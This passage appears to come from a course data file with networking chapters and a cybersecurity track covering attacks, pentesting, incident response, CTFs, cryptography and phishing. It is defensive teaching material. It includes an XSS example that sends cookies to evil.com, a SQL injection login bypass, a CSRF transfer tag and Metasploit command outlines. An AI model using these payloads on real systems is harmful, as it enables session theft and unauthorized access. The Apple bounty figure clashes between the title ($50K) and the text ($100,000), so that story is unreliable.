<ul>
<li><strong>Slow:</strong> Traffic goes through 3 extra hops. Expect 2-10x slower speeds</li>
<li><strong>Exit node risk:</strong> Unencrypted traffic (HTTP) can be read by the exit node</li>
<li><strong>Not for large downloads or streaming:</strong> Too slow and puts strain on the network</li>
<li><strong>Timing attacks:</strong> A powerful attacker watching both entry and exit could correlate traffic</li>
</ul>
<p>Tor is used by journalists, activists, whistleblowers, and privacy-conscious users. It is also used for illegal purposes, which gives it a mixed reputation.</p>`
      },
      {
        titleEn: "Think Outside the Network",
        type: "thinkOutside",
        contentEn: `{}`
      },
      {
        titleEn: "Chapter Summary",
        contentEn: `<ul>
<li>Your ISP sees DNS queries and SNI (domain names) even with HTTPS. DoH and ECH can hide these</li>
<li>Browser fingerprinting identifies you without cookies — canvas, fonts, GPU, screen, and more make a unique combination</li>
<li>Google and Meta track you across the web using tracking pixels and third-party cookies. They build detailed interest profiles</li>
<li>Tor routes traffic through 3 nodes (guard, middle, exit) — no single node knows both your identity and destination</li>
<li>Privacy is a spectrum: HTTPS → DoH → VPN → Tor. Each adds protection but also complexity and speed cost</li>
</ul>`
      },
      {
        titleEn: "Test Your Knowledge",
        type: "questions",
        contentEn: `{}`
      }
    ]
  },

  26: {
    titleEn: "The Future of Networking",
    pages: [
      {
        titleEn: "QUIC Protocol — 0-RTT and HTTP/3",
        contentEn: `<p><strong>QUIC</strong> is the biggest change in internet transport since TCP. Built by Google, now an IETF standard (RFC 9000, 2021).</p>
<h3>Why QUIC was created:</h3>
<ul>
<li>TCP + TLS handshake takes 2-3 round trips before any data flows</li>
<li>TCP head-of-line blocking: one lost packet blocks all streams</li>
<li>Changing TCP is nearly impossible — too many middleboxes depend on it</li>
<li>Solution: build a new protocol on top of UDP</li>
</ul>
<h3>Key features:</h3>
<ul>
<li><strong>0-RTT connection:</strong> For returning visitors, data can be sent with the very first packet. No waiting</li>
<li><strong>Independent streams:</strong> Loss on stream A does not block stream B</li>
<li><strong>Built-in TLS 1.3:</strong> Always encrypted, encryption is not optional</li>
<li><strong>Connection migration:</strong> If your IP changes (Wi-Fi to cellular), the connection continues. QUIC uses connection IDs, not IP+port tuples</li>
</ul>
<h3>HTTP/3 = HTTP over QUIC:</h3>
<ul>
<li>HTTP/1.1 → HTTP/2: multiplexing on TCP</li>
<li>HTTP/2 → HTTP/3: multiplexing on QUIC (UDP). No more TCP limitations</li>
<li>Used by Google, YouTube, Facebook, Cloudflare</li>
<li>About 30% of web traffic (2024)</li>
</ul>
<p>QUIC will likely become the dominant transport protocol for the web within the next decade.</p>`
      },
      {
        titleEn: "eBPF — Programmable Kernel",
        contentEn: `<p><strong>eBPF</strong> (extended Berkeley Packet Filter) lets you run custom programs inside the Linux kernel — without changing the kernel itself.</p>
<h3>Why this matters:</h3>
<ul>
<li>Traditionally, adding features to the kernel meant writing kernel modules — risky, complex, could crash the system</li>
<li>eBPF programs run in a safe sandbox inside the kernel</li>
<li>They are verified before running — cannot crash the kernel or access unauthorized memory</li>
</ul>
<h3>Networking use cases:</h3>
<ul>
<li><strong>High-speed packet processing:</strong> Handle millions of packets per second without leaving the kernel</li>
<li><strong>Load balancing:</strong> Facebook uses eBPF (Katran) for L4 load balancing. Much faster than iptables</li>
<li><strong>Firewalls:</strong> Cloudflare uses eBPF for DDoS mitigation at wire speed</li>
<li><strong>Observability:</strong> Trace every network call, measure latency, detect anomalies — with almost zero overhead</li>
</ul>
<h3>Beyond networking:</h3>
<ul>
<li>Security monitoring (Cilium, Falco)</li>
<li>Performance profiling</li>
<li>Custom system call tracing</li>
</ul>
<p>eBPF is called "the biggest change in Linux networking in decades." It makes the kernel programmable without the risks of kernel development.</p>`
      },
      {
        titleEn: "Starlink — Internet from Space",
        contentEn: `<p><strong>Starlink</strong> (SpaceX) puts thousands of satellites in Low Earth Orbit (LEO) to provide internet everywhere.</p>
<h3>Traditional satellites vs Starlink:</h3>
<ul>
<li><strong>Geostationary (GEO):</strong> 35,786 km altitude. Latency: 600+ ms round trip. Too slow for real-time use</li>
<li><strong>Starlink (LEO):</strong> 550 km altitude. Latency: 20-60 ms. Comparable to ground-based internet</li>
</ul>
<h3>How it works:</h3>
<ul>
<li>6,000+ satellites in orbit (planned: 12,000-42,000)</li>
<li>Satellites communicate with ground terminals (dish antennas)</li>
<li>Laser links between satellites allow traffic to hop between them without touching the ground</li>
<li>Speeds: 50-250 Mbps download (depends on location and congestion)</li>
</ul>
<h3>Why it matters for networking:</h3>
<ul>
<li><strong>Rural areas:</strong> Internet where no cable or fiber exists</li>
<li><strong>Disaster recovery:</strong> Deployed in Ukraine, natural disaster zones</li>
<li><strong>Maritime and aviation:</strong> Internet on ships and planes</li>
<li><strong>Potentially faster than fiber for long distances:</strong> Light travels faster in vacuum than in glass. Laser links between satellites could beat undersea cables for intercontinental traffic</li>
</ul>
<h3>Challenges:</h3>
<ul>
<li>Space debris and orbital congestion</li>
<li>Limited capacity per area (shared bandwidth)</li>
<li>Astronomy impact (light pollution)</li>
</ul>`
      },
      {
        titleEn: "Service Mesh and Zero Trust",
        contentEn: `<p>The old security model: trust everything inside the corporate network. The new model: <strong>trust nothing, verify everything</strong>.</p>
<h3>Why the old model broke:</h3>
<ul>
<li>Remote work: employees are not inside the office network</li>
<li>Cloud services: data is not in your data center</li>
<li>Once an attacker gets inside the perimeter, they can move freely</li>
</ul>
<h3>Zero Trust principles:</h3>
<ul>
<li><strong>Verify every request:</strong> Identity, device health, location, behavior — every time</li>
<li><strong>Least privilege:</strong> Give the minimum access needed, nothing more</li>
<li><strong>Assume breach:</strong> Design as if an attacker is already inside</li>
<li><strong>Encrypt everything:</strong> Even internal traffic between services</li>
</ul>
<h3>Service Mesh enables Zero Trust:</h3>
<ul>
<li><strong>mTLS (mutual TLS):</strong> Both sides of every connection prove their identity</li>
<li><strong>Fine-grained policies:</strong> Service A can talk to Service B, but not Service C</li>
<li><strong>Automatic certificate rotation:</strong> Keys change regularly, limiting breach impact</li>
<li><strong>Observability:</strong> Every request is logged, traced, and measured</li>
</ul>
<h3>Tools:</h3>
<ul>
<li><strong>Istio:</strong> Most popular service mesh, uses Envoy proxy sidecars</li>
<li><strong>Cilium:</strong> eBPF-based, no sidecars needed, faster</li>
<li><strong>Cloudflare Zero Trust:</strong> Replaces VPN for remote access</li>
</ul>
<p>Zero Trust is not a product. It is an architecture that assumes the network is always hostile.</p>`
      },
      {
        titleEn: "Think Outside the Network",
        type: "thinkOutside",
        contentEn: `{}`
      },
      {
        titleEn: "Chapter Summary",
        contentEn: `<ul>
<li>QUIC: UDP-based transport with 0-RTT, independent streams, built-in encryption, and connection migration. Powers HTTP/3</li>
<li>eBPF: Run custom programs safely inside the Linux kernel. Enables high-speed packet processing, load balancing, and observability</li>
<li>Starlink: 6,000+ LEO satellites at 550 km. Latency 20-60 ms. Brings internet to areas without cables. Laser inter-satellite links</li>
<li>Zero Trust: Trust nothing, verify everything. Service mesh (Istio, Cilium) enforces mTLS, policies, and observability between services</li>
<li>These technologies are reshaping how networks are built, secured, and delivered</li>
</ul>`
      },
      {
        titleEn: "Test Your Knowledge",
        type: "questions",
        contentEn: `{}`
      }
    ]
  },

  // ========== CYBER TRACK (101-115) ==========
101: {
    titleEn: "The CIA Triad & Threat Modeling",
    pages: [
      {
        titleEn: "The CIA Triad",
        contentEn: `Every security system is built on three pillars — the **CIA Triad**:

- **Confidentiality** — only the right people can see the data. Example: encryption, access control.
- **Integrity** — data is not changed without permission. Example: checksums, digital signatures.
- **Availability** — the system works when users need it. Example: backups, redundancy.

If one pillar breaks, the whole system is at risk.

**Quick check:**
- A hacker deletes your database → which pillar is broken? → **Availability**
- A hacker reads your passwords → **Confidentiality**
- A hacker changes your bank balance → **Integrity**`
      },
      {
        titleEn: "STRIDE Threat Modeling",
        contentEn: `**STRIDE** is a framework by Microsoft. It helps teams find threats before attackers do.

Each letter is a threat type:
- **S**poofing — pretending to be someone else (fake login)
- **T**ampering — changing data without permission
- **R**epudiation — denying you did something (no logs)
- **I**nformation Disclosure — leaking private data
- **D**enial of Service — making the system unavailable
- **E**levation of Privilege — getting admin access as a normal user

**How to use STRIDE:**
1. Draw a diagram of your system
2. For each component, ask: "Can an attacker do S? T? R? I? D? E?"
3. For each threat found, plan a defense`
      },
      {
        titleEn: "Story: The Target Breach (2013)",
        contentEn: `In December 2013, hackers stole **40 million** credit card numbers from Target stores.

**How it happened:**
- Attackers sent a phishing email to an HVAC company (heating/cooling vendor)
- The vendor had network access to Target for billing
- Hackers used that access to move inside Target's network
- They installed malware on cash registers (POS systems)
- Every credit card swipe was copied and sent to the attackers

**CIA Triad analysis:**
- **Confidentiality** broken — 40M card numbers leaked
- **Integrity** broken — malware changed how POS systems worked
- **Availability** was fine — stores kept working (that's why nobody noticed)

**Lesson:** Your security is only as strong as your weakest vendor. This attack started with a simple phishing email.

**Cost to Target:** $292 million in damages. The CEO and CIO both lost their jobs.`
      }
    ]
  },

  102: {
    titleEn: "Network Attacks: ARP, SYN Flood & DDoS",
    pages: [
      {
        titleEn: "ARP Spoofing & Man-in-the-Middle",
        contentEn: `**ARP** (Address Resolution Protocol) maps IP addresses to MAC addresses on a local network.

**ARP Spoofing attack:**
1. Attacker sends fake ARP messages to the network
2. Tells the victim: "I am the router" (sends attacker's MAC)
3. Tells the router: "I am the victim"
4. Now all traffic flows through the attacker — **Man-in-the-Middle (MITM)**

**What the attacker can do:**
- Read unencrypted passwords and messages
- Modify data in transit (change a bank transfer amount)
- Inject malicious code into web pages

**Defenses:**
- Use **HTTPS** everywhere (encrypted traffic)
- Enable **Dynamic ARP Inspection (DAI)** on switches
- Use **VPN** on untrusted networks (coffee shop WiFi)
- Static ARP entries for critical servers`
      },
      {
        titleEn: "SYN Flood & TCP Exhaustion",
        contentEn: `**TCP 3-Way Handshake** (normal):
1. Client sends **SYN** → "I want to connect"
2. Server sends **SYN-ACK** → "OK, go ahead"
3. Client sends **ACK** → "Connected!"

**SYN Flood attack:**
- Attacker sends thousands of SYN packets with fake source IPs
- Server sends SYN-ACK and waits for ACK... that never comes
- Server's connection table fills up — **no room for real users**
- Result: legitimate users cannot connect

**Why it works:**
- The server must keep each half-open connection in memory
- Default timeout is 75 seconds per connection
- Attacker can send millions of SYNs per second

**Defenses:**
- **SYN Cookies** — server doesn't store state until handshake completes
- **Rate limiting** — limit SYN packets per source IP
- **Firewall rules** — detect and block flood patterns`
      },
      {
        titleEn: "Story: The 3.47 Tbps DDoS Attack",
        contentEn: `In November 2021, Microsoft Azure stopped the **largest DDoS attack ever recorded**: **3.47 Tbps** (terabits per second).

**Scale:**
- 3.47 Tbps = downloading ~43,000 HD movies per second
- The attack came from **10,000+ sources** across 10+ countries
- It lasted only 15 minutes but peaked at 340 million packets per second

**How it was stopped:**
- Azure's DDoS Protection platform detected the spike in seconds
- Traffic was spread across Microsoft's global network (160+ data centers)
- Bad traffic was filtered; good traffic passed through
- The customer's service stayed online the entire time

**Types of DDoS:**
- **Volumetric** — flood the bandwidth (UDP flood, DNS amplification)
- **Protocol** — exhaust server resources (SYN flood, Ping of Death)
- **Application** — target specific services (HTTP flood, Slowloris)

**Key point:** You cannot stop DDoS alone. You need cloud-scale protection (Azure, Cloudflare, AWS Shield).`
      }
    ]
  },

  103: {
    titleEn: "Web Attacks: SQL Injection, XSS & OWASP",
    pages: [
      {
        titleEn: "SQL Injection (SQLi)",
        contentEn: `**SQL Injection** — the attacker puts SQL code into input fields to control the database.

**Example — login bypass:**
\`\`\`
Username: admin' --
Password: anything
\`\`\`

The server builds this query:
\`\`\`sql
SELECT * FROM users WHERE name='admin' --' AND pass='anything'
\`\`\`

The \`--\` is a comment. Everything after it is ignored. The attacker logs in as admin without a password.

**What an attacker can do:**
- Read all data (usernames, passwords, credit cards)
- Modify or delete data
- Execute system commands (on some databases)

**Defenses:**
- **Parameterized queries** (prepared statements) — #1 defense
- **Input validation** — reject special characters
- **WAF** (Web Application Firewall) — block known attack patterns
- **Least privilege** — database user should not be admin`
      },
      {
        titleEn: "XSS and CSRF",
        contentEn: `**XSS (Cross-Site Scripting)** — attacker injects JavaScript into a web page.

**Types:**
- **Stored XSS** — script is saved in the database (e.g., in a comment). Every user who views it gets attacked.
- **Reflected XSS** — script is in the URL. Victim clicks a malicious link.
- **DOM XSS** — script runs from client-side JavaScript, never touches the server.

**Example:**
\`\`\`html
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
\`\`\`

**CSRF (Cross-Site Request Forgery)** — the attacker tricks your browser into making a request you didn't intend.

**Example:** You are logged into your bank. You visit a malicious page with:
\`\`\`html
<img src="https://bank.com/transfer?to=attacker&amount=1000">
\`\`\`
Your browser sends the request with your session cookie. The bank thinks it's you.

**Defenses:**
- XSS → **escape/encode** all user output, use **Content Security Policy (CSP)**
- CSRF → **CSRF tokens**, **SameSite cookies**, check **Referer header**`
      },
      {
        titleEn: "OWASP Top 10 (2021)",
        contentEn: `**OWASP** (Open Web Application Security Project) publishes the top 10 web security risks every few years.

**The 2021 list:**

| # | Risk | Example |
|---|------|---------|
| 1 | **Broken Access Control** | User changes URL to access admin page |
| 2 | **Cryptographic Failures** | Passwords stored in plain text |
| 3 | **Injection** | SQL injection, command injection |
| 4 | **Insecure Design** | No rate limiting on login (brute force) |
| 5 | **Security Misconfiguration** | Default passwords, open S3 buckets |
| 6 | **Vulnerable Components** | Using old library with known CVE |
| 7 | **Auth Failures** | Weak passwords, no MFA |
| 8 | **Data Integrity Failures** | Insecure deserialization, no code signing |
| 9 | **Logging Failures** | No logs → can't detect attacks |
| 10 | **SSRF** | Server fetches attacker-controlled URL |

**Key changes from 2017:**
- Broken Access Control moved from #5 to #1
- Insecure Design is new (focus on threat modeling)
- SSRF is new (cloud environments made it worse)`
      }
    ]
  },

  104: {
    titleEn: "Penetration Testing",
    pages: [
      {
        titleEn: "The Pentest Lifecycle",
        contentEn: `**Penetration testing (pentest)** = authorized hacking to find security weaknesses.

**5 phases:**

**1. Reconnaissance (Recon)**
- Passive: Google dorking, WHOIS, LinkedIn, Shodan
- Active: port scanning, service detection
- Goal: learn everything about the target

**2. Scanning & Enumeration**
- Find open ports, running services, versions
- Identify operating systems and technologies
- Look for known vulnerabilities (CVEs)

**3. Exploitation**
- Try to break in using found vulnerabilities
- Gain initial access (foothold)
- Escalate privileges if possible

**4. Post-Exploitation**
- Move laterally (access other systems)
- Maintain access (persistence)
- Collect evidence (screenshots, data samples)

**5. Reporting**
- Document every finding with severity rating
- Include proof-of-concept (PoC) for each vulnerability
- Recommend fixes with priority order

**Important:** Always get **written permission** before testing. Without it, it's a crime.`
      },
      {
        titleEn: "Essential Pentest Tools",
        contentEn: `**Nmap** — network scanner
- Finds open ports and running services
- \`nmap -sV -sC target.com\` — version detection + default scripts
- \`nmap -p- target.com\` — scan all 65,535 ports
- Can detect OS, firewalls, and vulnerabilities

**Burp Suite** — web application proxy
- Intercepts HTTP/HTTPS requests between browser and server
- **Repeater** — modify and resend requests
- **Intruder** — automated fuzzing and brute force
- **Scanner** — automatic vulnerability detection (Pro version)

**Metasploit** — exploitation framework
- Database of 2,000+ exploits
- \`search ms17-010\` → find EternalBlue exploit
- \`use exploit/...\` → \`set RHOST target\` → \`exploit\`
- **Meterpreter** — powerful post-exploitation shell

**Other key tools:**
- **Wireshark** — packet capture and analysis
- **John the Ripper / Hashcat** — password cracking
- **Gobuster / ffuf** — directory and file brute forcing
- **SQLMap** — automated SQL injection testing`
      },
      {
        titleEn: "Story: Red Team vs. The Bank",
        contentEn: `A major bank hired a Red Team to test their security. The rules: get access to the CEO's email within 2 weeks.

**Week 1 — Reconnaissance:**
- Team found the bank's IT staff on LinkedIn
- Discovered the bank used Microsoft 365 and Citrix VPN
- Found an old subdomain: \`test-portal.bank.com\` — still running

**Week 1 — Initial Access:**
- The test portal had a known Citrix vulnerability (CVE-2019-19781)
- Team exploited it and got a shell on an internal server
- Found a shared drive with an Excel file: "IT_passwords_2019.xlsx"

**Week 2 — Lateral Movement:**
- Old passwords still worked for 3 IT admin accounts
- Used admin access to reach the Exchange email server
- Read the CEO's inbox — mission complete in 8 days

**Report findings:**
- Critical: unpatched public-facing server
- Critical: passwords stored in plain text on shared drive
- High: old passwords never rotated
- High: no network segmentation (test server could reach email)

**Result:** The bank fixed all findings, and the Red Team was invited back for a retest 6 months later.`
      }
    ]
  },

  105: {
    titleEn: "Defense in Depth & Incident Response",
    pages: [
      {
        titleEn: "Defense in Depth",
        contentEn: `**Defense in Depth** = multiple layers of security. If one layer fails, the next one catches the attack.

**The layers (outside → inside):**

- **Physical** — locked server rooms, security cameras, badge access
- **Perimeter** — firewalls, IDS/IPS, DMZ
- **Network** — segmentation, VLANs, ACLs, network monitoring
- **Host** — antivirus, host firewall, patching, hardening
- **Application** — secure coding, input validation, WAF
- **Data** — encryption, access control, backups, DLP

**Why layers matter:**
- Firewall blocks 99% of attacks → but 1% gets through
- Antivirus catches most malware → but zero-days pass
- Encryption protects data → but only if keys are safe

**Analogy:** A castle has walls, a moat, guards, locked doors, and a safe. An attacker must beat ALL of them, not just one.

**Key principles:**
- No single point of failure
- Assume every layer will be bypassed
- Monitor every layer for alerts`
      },
      {
        titleEn: "SIEM & Incident Response",
        contentEn: `**SIEM** (Security Information and Event Management) — collects logs from all systems and finds threats.

**What SIEM does:**
- Collects logs from firewalls, servers, endpoints, apps
- Correlates events across systems
- Detects patterns (e.g., 100 failed logins then 1 success = brute force)
- Generates alerts for the SOC (Security Operations Center) team

**Popular SIEM tools:** Splunk, Microsoft Sentinel, IBM QRadar, Elastic SIEM

**Incident Response (IR) — 6 phases (NIST):**
1. **Preparation** — build the IR team, write playbooks, set up tools
2. **Identification** — detect the incident (SIEM alert, user report)
3. **Containment** — stop the attack from spreading (isolate systems)
4. **Eradication** — remove the attacker (delete malware, patch vuln)
5. **Recovery** — restore systems from clean backups, monitor closely
6. **Lessons Learned** — what happened? how to prevent it next time?

**SOC analyst tiers:**
- **Tier 1** — monitors alerts, triages (real or false positive?)
- **Tier 2** — investigates confirmed incidents
- **Tier 3** — threat hunting, malware analysis, forensics`
      },
      {
        titleEn: "Story: SOC Analyst Finds an APT",
        contentEn: `Monday morning. A Tier 1 SOC analyst notices something strange in the SIEM:

**The alert:** A server in the finance department made DNS requests to a domain registered 2 days ago. The requests happened every 4 hours, exactly.

**Why it's suspicious:**
- New domains are often used by attackers
- Regular 4-hour intervals suggest automated malware (beaconing)
- Finance servers should not make unusual DNS requests

**Investigation (Tier 2):**
- The domain resolved to an IP in Eastern Europe
- The DNS requests contained encoded data in the subdomain field — **DNS exfiltration**
- The server had a hidden scheduled task running a PowerShell script
- The script collected financial reports and sent them via DNS

**Discovery:**
- The attacker had been inside the network for **6 months** (APT — Advanced Persistent Threat)
- Entry point: a spear-phishing email to the CFO with a weaponized PDF
- The PDF exploited an Adobe Reader vulnerability

**Response:**
- Contained: isolated the server and blocked the domain
- Eradicated: removed the scheduled task and backdoor
- Recovered: rebuilt the server from a clean image
- Lesson: deployed DNS monitoring and blocked DNS over non-standard ports

**Key takeaway:** APTs are quiet. Without SIEM and trained analysts, this could have continued for years.`
      }
    ]
  },

  106: {
    titleEn: "CTF & Bug Bounty",
    pages: [
      {
        titleEn: "Capture The Flag (CTF)",
        contentEn: `**CTF** = a hacking competition where teams solve security challenges to find hidden "flags" (secret strings).

**CTF types:**
- **Jeopardy** — categories with challenges of different difficulty. Categories: Web, Crypto, Reverse Engineering, Forensics, Binary Exploitation (pwn)
- **Attack-Defense** — each team has a server. Attack other teams while defending your own.
- **King of the Hill** — capture and hold a server as long as possible.

**Example challenge (Web):**
- You get a website with a login page
- The hint says: "The admin left a note"
- You check the HTML source → hidden comment: \`<!-- password: s3cur3 -->\`
- Login with admin/s3cur3 → get the flag: \`FLAG{html_comments_are_not_secure}\`

**Skills you learn:**
- Web exploitation (SQLi, XSS, SSRF)
- Binary analysis and reverse engineering
- Cryptography (break weak encryption)
- Forensics (analyze pcap files, disk images, memory dumps)

**Where to practice:**
- **PicoCTF** — beginner friendly (by Carnegie Mellon)
- **HackTheBox** — virtual machines to hack
- **TryHackMe** — guided learning paths
- **OverTheWire** — Linux and networking challenges`
      },
      {
        titleEn: "Bug Bounty Programs",
        contentEn: `**Bug Bounty** = companies pay hackers to find and report security vulnerabilities.

**How it works:**
1. Company publishes a program (scope, rules, rewards)
2. Hackers find vulnerabilities and write reports
3. Company verifies and pays based on severity

**Severity and typical rewards:**
- **Critical** (RCE, auth bypass) → $10,000 – $100,000+
- **High** (SQLi, SSRF, privilege escalation) → $5,000 – $25,000
- **Medium** (stored XSS, IDOR) → $1,000 – $5,000
- **Low** (reflected XSS, info disclosure) → $100 – $1,000

**Major platforms:**
- **HackerOne** — largest platform, $300M+ paid total
- **Bugcrowd** — second largest, strong triage team
- **Intigriti** — popular in Europe

**The industry in numbers:**
- $1.5 billion+ paid to hackers total (all platforms)
- Top hackers earn $500K+ per year
- 30,000+ organizations run programs
- Average time to first valid bug: 2-3 months for beginners

**Tips for beginners:**
- Start with programs that have a wide scope
- Focus on one vulnerability type (e.g., IDOR)
- Read disclosed reports on HackerOne to learn
- Write clear reports with steps to reproduce`
      },
      {
        titleEn: "Story: Apple's $50K Bounty",
        contentEn: `In 2020, a security researcher found a critical vulnerability in **Apple's Sign In** system.

**The bug:**
- "Sign in with Apple" lets you log into apps using your Apple ID
- The researcher found he could request a token for **any Apple ID email**
- With this token, he could log into any app that uses "Sign in with Apple" — as any user

**Impact:**
- Full account takeover on any app using Apple Sign In
- Affected millions of users on thousands of apps
- No user interaction needed — completely silent attack

**How he reported it:**
1. Found the bug and tested on his own accounts
2. Wrote a detailed report with proof-of-concept
3. Submitted to Apple's Bug Bounty program
4. Apple confirmed and fixed the bug within days

**Reward: $100,000** (Apple's highest bounty category)

**Why this story matters:**
- One person, one bug, huge impact
- Responsible disclosure protected millions of users
- The researcher earned $100K legally — and built his reputation
- Without bug bounties, this bug might have been sold on the dark web or exploited silently

**The alternative:** On the black market, this bug could sell for $500K+. Bug bounties give hackers a legal and ethical path.`
      }
    ]
  },

  107: {
    titleEn: "Cryptography & Encryption",
    pages: [
      {
        titleEn: "Symmetric vs Asymmetric Encryption",
        contentEn: `**Encryption** = turning readable data (plaintext) into unreadable data (ciphertext). Only someone with the key can read it.

**Symmetric encryption** — same key to encrypt and decrypt:
- Fast, efficient for large data
- Problem: how do you share the key securely?
- Algorithms: **AES** (standard, 128/256 bit), DES (old, broken), ChaCha20

**Example:**
\`\`\`
Plaintext: "Hello" + Key: "s3cr3t" → Ciphertext: "x7#kQ..."
Ciphertext: "x7#kQ..." + Key: "s3cr3t" → Plaintext: "Hello"
\`\`\`

**Asymmetric encryption** — two keys: public key + private key:
- Public key encrypts → only private key can decrypt
- Slow, used for small data (keys, signatures)
- Algorithms: **RSA** (2048/4096 bit), **ECC** (smaller keys, same security)

**Example:**
\`\`\`
Alice wants to send Bob a message:
1. Bob shares his PUBLIC key with Alice
2. Alice encrypts with Bob's public key
3. Only Bob's PRIVATE key can decrypt
\`\`\`

**In practice:** Both are used together. Asymmetric encrypts a symmetric key. Then symmetric encrypts the data. This is called a **hybrid system**.`
      },
      {
        titleEn: "The TLS Handshake",
        contentEn: `**TLS** (Transport Layer Security) protects data between your browser and the server. The padlock icon in your browser = TLS is active.

**TLS Handshake steps:**

\`\`\`
Browser                          Server
   |                                |
   |--- 1. ClientHello ----------->|  (supported ciphers, TLS version)
   |                                |
   |<-- 2. ServerHello ------------|  (chosen cipher, server certificate)
   |                                |
   |    3. Browser verifies        |  (is certificate valid? trusted CA?)
   |       server certificate      |
   |                                |
   |--- 4. Key Exchange ---------->|  (both sides compute shared secret)
   |                                |
   |<== 5. Encrypted tunnel ======>|  (all data encrypted with shared key)
\`\`\`

**Key concepts:**
- **Certificate** — proves the server is who it says it is (signed by a CA)
- **CA (Certificate Authority)** — trusted organizations that issue certificates (Let's Encrypt, DigiCert)
- **Cipher suite** — the combination of algorithms used (e.g., TLS_AES_256_GCM_SHA384)

**TLS versions:**
- TLS 1.0, 1.1 — deprecated, insecure
- **TLS 1.2** — still widely used, secure
- **TLS 1.3** — latest, faster handshake (1 round trip instead of 2)`
      },
      {
        titleEn: "WhatsApp End-to-End Encryption",
        contentEn: `**End-to-End Encryption (E2E)** = only the sender and receiver can read the messages. Not even the service provider (WhatsApp/Signal) can read them.

**How WhatsApp E2E works (Signal Protocol):**

1. **Key generation** — each phone creates a key pair (public + private)
2. **Key exchange** — phones exchange public keys when you start a chat
3. **Message encryption** — each message is encrypted with a unique key
4. **Forward secrecy** — even if one key is stolen, past messages stay safe

**What WhatsApp CAN see:**
- Who you talk to (metadata)
- When you send messages (timestamps)
- Your phone number and contacts

**What WhatsApp CANNOT see:**
- Message content (text, photos, videos)
- Voice and video call content

**Why metadata matters:**
- "You called a suicide hotline at 2 AM for 45 minutes" — no content needed to learn a lot
- Governments have requested metadata from WhatsApp

**Comparison:**
- **WhatsApp** — E2E by default, closed source
- **Signal** — E2E by default, open source, minimal metadata
- **Telegram** — E2E only in "Secret Chats" (not default!)`
      },
      {
        titleEn: "Story: The Heartbleed Bug",
        contentEn: `In April 2014, researchers discovered **Heartbleed** — a bug in OpenSSL that affected **17% of all web servers**.

**What is OpenSSL?**
- The most popular library for TLS/SSL encryption
- Used by millions of websites, email servers, VPNs

**The bug (CVE-2014-0160):**
- TLS has a "heartbeat" feature — a keep-alive ping between client and server
- Client sends: "Here is a 4-byte word: 'bird'. Send it back."
- Server reads 4 bytes and sends back: "bird" ✓

**The exploit:**
- Attacker sends: "Here is a 40,000-byte word: 'bird'. Send it back."
- Server doesn't check the real length
- Server reads 40,000 bytes from memory and sends them back
- Those bytes contain: **private keys, passwords, session tokens**

**Impact:**
- Attacker could steal the server's **private SSL key**
- With the key → decrypt all traffic (past and future)
- No trace in server logs — completely invisible

**The fix:**
- Add one line of code: check that the claimed length matches the actual length
- The bug existed for **2 years** before discovery (introduced in 2012)

**Lesson:** One small coding mistake in a critical library can break the security of half the internet.`
      }
    ]
  },

  108: {
    titleEn: "Social Engineering Attacks",
    pages: [
      {
        titleEn: "Anatomy of a Phishing Attack",
        contentEn: `**Phishing** = tricking people into giving up passwords, clicking malicious links, or downloading malware.

**Phishing email red flags:**
- Urgent language: "Your account will be closed in 24 hours!"
- Generic greeting: "Dear Customer" (not your name)
- Suspicious sender: support@amaz0n-security.com (not amazon.com)
- Mismatched link: text says "amazon.com" but link goes to "amaz0n.evil.com"
- Unexpected attachment: "Invoice_March.pdf.exe"

**Types of phishing:**
- **Mass phishing** — same email to millions of people
- **Spear phishing** — targeted at a specific person (uses personal details)
- **Whaling** — spear phishing aimed at executives (CEO, CFO)
- **Clone phishing** — copies a real email you received, replaces the attachment

**How to check a suspicious email:**
1. Hover over links — check the real URL before clicking
2. Check the sender's actual email address (not just the display name)
3. Look for spelling and grammar mistakes
4. Ask yourself: "Did I expect this email?"
5. When in doubt — go directly to the website (don't click the link)`
      },
      {
        titleEn: "Vishing, Smishing & Pretexting",
        contentEn: `**Vishing** (Voice Phishing) — attacks over the phone:
- Caller pretends to be your bank, IT support, or government
- Uses caller ID spoofing (shows a real bank number)
- Creates urgency: "Suspicious transaction on your account right now!"
- Goal: get your password, OTP code, or credit card number

**Smishing** (SMS Phishing) — attacks via text message:
- "Your package is waiting. Track here: bit.ly/susp1c10us"
- "Bank alert: unusual login. Verify: [link]"
- Short links hide the real destination
- Works because people trust SMS more than email

**Pretexting** — creating a fake scenario to build trust:
- Attacker calls IT help desk: "Hi, I'm John from the marketing team. I forgot my password and I have a presentation in 10 minutes. Can you reset it?"
- Attacker poses as a fire inspector to walk through the building
- Uses authority, urgency, or sympathy to bypass security

**Why social engineering works:**
- Humans are the weakest link in security
- People want to be helpful
- Urgency bypasses critical thinking
- Authority makes people comply without questioning`
      },
      {
        titleEn: "Story: The Twitter Hack (2020)",
        contentEn: `On July 15, 2020, high-profile Twitter accounts were hijacked — including **Barack Obama, Elon Musk, Bill Gates, and Apple**.

**The tweets:** "I'm giving back! Send $1,000 in Bitcoin and I'll send you $2,000 back." All tweets linked to the same Bitcoin wallet.

**How it happened:**
1. A 17-year-old from Florida called Twitter employees
2. He pretended to be from Twitter's IT department
3. He convinced employees to enter their credentials on a fake internal tool page (**vishing + phishing**)
4. With employee access, he used Twitter's internal admin panel
5. He took over 130 accounts, tweeted from 45 of them

**Result:**
- $120,000 stolen in Bitcoin within hours
- Twitter stock dropped 4%
- Twitter had to disable tweeting for all verified accounts temporarily

**The arrest:**
- FBI tracked the Bitcoin transactions
- The 17-year-old was arrested 2 weeks later
- Sentenced to 3 years in juvenile detention

**Lessons:**
- Internal tools need strong access controls (MFA, audit logs)
- Even big tech companies are vulnerable to social engineering
- Security awareness training is essential for all employees
- A teenager with no technical exploit — just social skills — took over Twitter`
      },
      {
        titleEn: "Defense Against Social Engineering",
        contentEn: `**For individuals:**
- Enable **MFA** (Multi-Factor Authentication) everywhere
- Use a **password manager** (unique passwords for every site)
- Never share passwords, OTP codes, or personal info over phone/email
- Verify requests through a different channel (call back on official number)
- If it feels urgent — slow down and think

**For organizations:**

**Security Awareness Training:**
- Regular phishing simulations (monthly)
- Train employees to report suspicious emails (reward reporting)
- Special training for high-risk roles (finance, HR, executives)

**Technical controls:**
- Email filtering and anti-phishing gateways
- DMARC/SPF/DKIM — prevent email spoofing
- MFA for all internal tools (especially admin panels)
- Principle of least privilege — limit access to what's needed

**Processes:**
- Verify identity before password resets (callback procedure)
- Two-person approval for financial transfers over threshold
- Visitor badges and escort policy for physical access
- Incident reporting hotline (make it easy to report)

**Key metric:** Click rate on phishing simulations. Good companies aim for <5%. Average is 20-30%.`
      }
    ]
  },

  109: {
